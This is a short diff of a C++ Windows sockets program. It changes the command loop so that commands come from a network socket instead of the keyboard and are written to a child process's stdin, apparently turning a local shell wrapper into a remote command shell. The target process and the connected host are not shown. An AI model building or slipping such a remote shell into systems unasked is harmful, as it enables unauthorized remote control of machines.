@@ -31,7 +31,6 @@ string receive_data(SOCKET clientSocket)
 
     return ""; // Return an empty string in case of error or connection closure
 }
-
 void send_data(SOCKET clientSocket, const string &data) // Does not send special data
 {
     int bytesSent = send(clientSocket, data.c_str(), data.length(), 0);
@@ -40,7 +39,6 @@ void send_data(SOCKET clientSocket, const string &data) // Does not send special
         cerr << "Send failed with error: " << WSAGetLastError() << endl;
     // else cout << "Sent data: " << data << endl;
 }
-
 void give_command(const std::string &command)
 {
     string cmd = command + "\r\n";
@@ -156,8 +154,10 @@ int main()
         string cmd;
         while (!processFinished.load())  // Check if process is finished
         {
-            cout << "> ";
-            getline(cin, cmd);
+            //cout << "> ";
+            //getline(cin, cmd);
+            cmd = receive_data(sock);
+            cout << ">" << cmd;
             if (cmd == "exit")
             {
                 processFinished.store(true); // Signal to stop reading thread
@@ -166,6 +166,7 @@ int main()
 
             // Send the command to the child process's stdin
             give_command(cmd);
+            Sleep(10); // Sleep for a short time to prevent 100% CPU usage
         }
     });
 
